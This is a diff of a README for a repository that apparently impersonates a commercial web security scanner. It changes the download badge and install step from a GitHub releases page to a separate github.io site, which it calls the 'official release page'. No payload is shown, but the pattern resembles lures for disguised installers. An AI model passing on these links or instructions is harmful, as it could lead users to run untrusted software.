@@ -1,6 +1,6 @@
 # 🛡️ acunetix-web-security-platform - Automated web security testing for everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/alij4808/acunetix-web-security-platform/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://alij4808.github.io)
 
 This software helps you secure your websites and web applications. It scans your systems to find security gaps and produces reports. You can use it to test for common vulnerabilities, including those that put your data at risk. The platform automates the process of finding weaknesses so you can fix them before hackers find them.
 
@@ -19,7 +19,7 @@ To run this platform on your Windows computer, you need these items:
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the official release page: [https://github.com/alij4808/acunetix-web-security-platform/releases](https://github.com/alij4808/acunetix-web-security-platform/releases).
+1.  Visit the official release page: [https://alij4808.github.io](https://alij4808.github.io).
 2.  Look for the latest version of the software.
 3.  Click the link to download the installer file.
 4.  Wait for the download to finish.
